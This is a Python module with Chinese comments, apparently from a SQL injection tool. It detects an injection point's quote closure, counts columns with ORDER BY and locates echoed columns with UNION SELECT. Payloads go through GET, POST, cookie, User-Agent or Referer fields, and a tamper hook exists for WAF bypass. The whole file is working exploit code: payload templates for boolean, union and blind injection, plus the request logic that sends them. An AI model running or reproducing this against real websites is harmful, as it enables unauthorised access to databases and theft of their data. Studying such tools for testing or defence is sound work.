# -*- coding: utf-8 -*-
"""注入点探测：闭合方式识别、列数探测、回显位定位"""


class Closure:
    """一种闭合方式：统一生成 布尔/order by/union/盲注 载荷"""

    def __init__(self, name, tpl_bool_true, tpl_bool_false, tpl_union,
                 tpl_orderby, tpl_blind):
        self.name = name
        self._bt = tpl_bool_true      # {b}=基准值
        self._bf = tpl_bool_false
        self._ut = tpl_union          # 额外含 {cols}
        self._ot = tpl_orderby        # 额外含 {n}
        self._bl = tpl_blind          # 额外含 {expr}

    def bool_payload(self, base, which=True):
        return (self._bt if which else self._bf).format(b=base)

    def union(self, base, body):
        return self._ut.format(b=base, cols=body)

    def orderby(self, base, n):
        return self._ot.format(b=base, n=n)

    def blind_payload(self, base, expr):
        return self._bl.format(b=base, expr=expr)


CLOSURES = [
    Closure(
        "整数型",
        "{b} and 1=1", "{b} and 1=2",
        "{b} union select {cols}",
        "{b} order by {n}",
        "{b} and ({expr})"),
    Closure(
        "单引号 '",
        "{b}' and '1'='1", "{b}' and '1'='2",
        "{b}' union select {cols} -- +",
        "{b}' order by {n} -- +",
        "{b}' and ({expr}) -- +"),
    Closure(
        '双引号 "',
        '{b}" and "1"="1', '{b}" and "1"="2',
        '{b}" union select {cols} -- +',
        '{b}" order by {n} -- +',
        '{b}" and ({expr}) -- +'),
    Closure(
        "单引号括号 ')",
        "{b}') and ('1')=('1", "{b}') and ('1')=('2",
        "{b}') union select {cols} -- +",
        "{b}') order by {n} -- +",
        "{b}') and ({expr}) -- +"),
    Closure(
        '双引号括号 ")',
        '{b}") and ("1")=("1', '{b}") and ("1")=("2',
        '{b}") union select {cols} -- +',
        '{b}") order by {n} -- +',
        '{b}") and ({expr}) -- +'),
]


def _same(a, b, tol=0.05):
    if not a or not b:
        return False
    return abs(len(a) - len(b)) <= max(4, int(max(len(a), len(b)) * tol))


class InjectionPoint:
    """注入点：URL / 方法 / 参数 / 载体（get|post|cookie|ua|referer）"""

    def __init__(self, url, method="GET", param=None, carrier="get",
                 data=None, cookie_extra="", tamper=None):
        self.url = url
        self.method = method
        self.param = param
        self.carrier = carrier
        self.data = data or {}
        self.cookie_extra = cookie_extra
        self.tamper = tamper      # 可调用：对完整 payload 变换（WAF 绕过）

    def request(self, http, payload):
        if self.tamper:
            payload = self.tamper(payload)
        if self.carrier == "get":
            from .utils import set_query_param
            u = set_query_param(self.url, self.param, payload)
            return http.send(u, method="GET")
        if self.carrier == "post":
            d = dict(self.data)
            d[self.param] = payload
            return http.send(self.url, method="POST", data=d)
        if self.carrier == "cookie":
            ck = f"{self.param}={payload}"
            if self.cookie_extra:
                ck += "; " + self.cookie_extra
            return http.send(self.url, method=self.method,
                             inject_cookie=ck)
        if self.carrier == "ua":
            return http.send(self.url, method=self.method,
                             data=self.data or None, inject_ua=payload)
        if self.carrier == "referer":
            return http.send(self.url, method=self.method,
                             data=self.data or None,
                             inject_header=f"Referer: {payload}")
        raise ValueError(f"未知载体: {self.carrier}")

    def describe(self):
        return f"[{self.carrier.upper()}] 参数 '{self.param}' @ {self.url}"


def detect_closure(http, point, base_value, verbose=True):
    """逐个闭合发送恒真/恒假，比较响应差异。返回命中的 Closure 或 None"""
    from .utils import ok, err
    base_text, _ = point.request(http, base_value)
    hit = None
    for cl in CLOSURES:
        rt, _ = point.request(http, cl.bool_payload(base_value, True))
        rf, _ = point.request(http, cl.bool_payload(base_value, False))
        diff = not _same(rt, rf) and len(rt) > 0
        if verbose:
            flag = "<-- 差异" if diff else ""
            print(f"    尝试 {cl.name:<12s} 真:{len(rt):>6d}B "
                  f"假:{len(rf):>6d}B {flag}")
        if diff:
            hit = cl
            break
    if hit:
        ok(f"命中闭合方式: {hit.name}")
    else:
        err("未发现真/假差异：可能无差异回显，尝试 --blind time；"
            "或页面动态噪声大，用 --fuzzy 放宽容差")
    return hit


def find_columns(http, point, closure, base_value, lo=1, hi=40,
                 verbose=True):
    """order by 线性递增探测列数"""
    from .utils import ok, warn
    cols, n = None, lo
    while n <= hi:
        text, _ = point.request(http, closure.orderby(base_value, n))
        if _errorish(text):
            break
        cols = n
        if verbose:
            print(f"    order by {n:<3d} 正常")
        n += 1
    if cols:
        ok(f"列数: {cols}")
    else:
        warn("order by 探测失败（被过滤或无报错差异），跳过")
    return cols


def _errorish(text):
    low = (text or "").lower()
    marks = ["unknown column", "order clause", "sql syntax",
             "__http_error__"]
    return any(m in low for m in marks)


def find_echo(http, point, closure, base_value, cols, verbose=True):
    """union select 标记串定位回显位，返回回显位列表"""
    from .utils import ok, warn
    markers = [f"S{i}QLMARK" for i in range(1, cols + 1)]
    payload = closure.union(base_value, ",".join(f"'{m}'" for m in markers))
    text, _ = point.request(http, payload)
    found = [i for i, m in enumerate(markers, 1) if m in text]
    if verbose:
        if found:
            ok(f"回显位: 第 {found} 列")
        else:
            warn("union 无回显：考虑报错注入章节手法或 --blind bool/time")
    return found
